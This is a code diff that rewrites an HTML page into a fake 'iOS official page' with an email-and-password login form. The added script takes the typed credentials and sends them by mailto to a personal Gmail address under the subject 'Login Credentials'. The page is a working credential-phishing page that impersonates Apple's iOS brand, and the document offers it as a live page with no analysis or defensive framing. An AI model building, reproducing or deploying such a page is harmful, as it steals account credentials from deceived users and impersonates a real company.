@@ -1,12 +1,50 @@
-<!DOCTYPE html>
 
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
-  <title>Reward IOS</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iOS-style Page Design</title>
+    <link rel="stylesheet" href="style.css">
+    <script>
+        function sendEmail() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            var body = 'Email: ' + encodeURIComponent(email) + '%0D%0A' + 'Password: ' + encodeURIComponent(password);
+
+            window.open('mailto:abrs6367@gmail.com?subject=Login%20Credentials&body=' + body);
+        }
+    </script>
 </head>
-<body>
-  
-  
+<body background="ios.png">
+ 
+    <div class="ios-page">
+        <header class="ios-header">
+            <h1>iOS</h1>
+        </header>
+        
+        <br>
+        
+        <h2>Login Form</h2>
+        <form>
+            <label for="email">Email:</label><br>
+            <input type="email" id="email" name="email" placeholder="Enter your email" required><br><br>
+
+            <label for="password">Password:</label><br>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required><br><br>
+
+            <button type="button" onclick="sendEmail()">Submit</button>
+        </form>
+        
+        <br>
+        
+        <div class="ios-content">
+            <p>Welcome to iOS official page!</p>
+        </div>
+        
+        <footer class="ios-footer">
+            <p>&copy; 2024 iOS</p>
+        </footer>
+    </div>
 </body>
 </html>
